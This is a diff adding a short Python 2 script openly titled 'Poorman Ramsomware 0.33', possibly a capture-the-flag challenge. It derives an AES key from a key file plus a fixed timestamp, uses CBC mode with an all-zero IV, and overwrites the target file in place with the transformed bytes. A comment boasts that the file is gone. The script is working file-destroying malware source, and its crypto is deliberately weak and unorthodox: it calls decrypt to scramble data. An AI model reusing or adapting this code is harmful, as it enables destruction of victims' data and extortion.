@@ -1,0 +1,28 @@
+# Poorman Ramsomware 0.33
+
+from Crypto.Cipher import AES
+import sys, time, datetime
+
+# read the secret key
+key = open('key').read()
+key = key[:-1]
+# add some randomness
+t = datetime.datetime(2016,4,20,17,26,33)
+tt = time.mktime(t.timetuple())
+key+= "%d"%int(tt)
+print "using key",key
+
+# Now some standard crypto..
+IV = 16 * '\x00'    
+mode = AES.MODE_CBC
+encryptor = AES.new(key, mode, IV=IV)
+
+data = open(sys.argv[1]).read()
+plaintext = encryptor.decrypt(data)
+
+# and bang.. the file is gone. Muahhahahah 
+f = open(sys.argv[1], 'wb')
+f.write(plaintext)
+f.close()
+
+
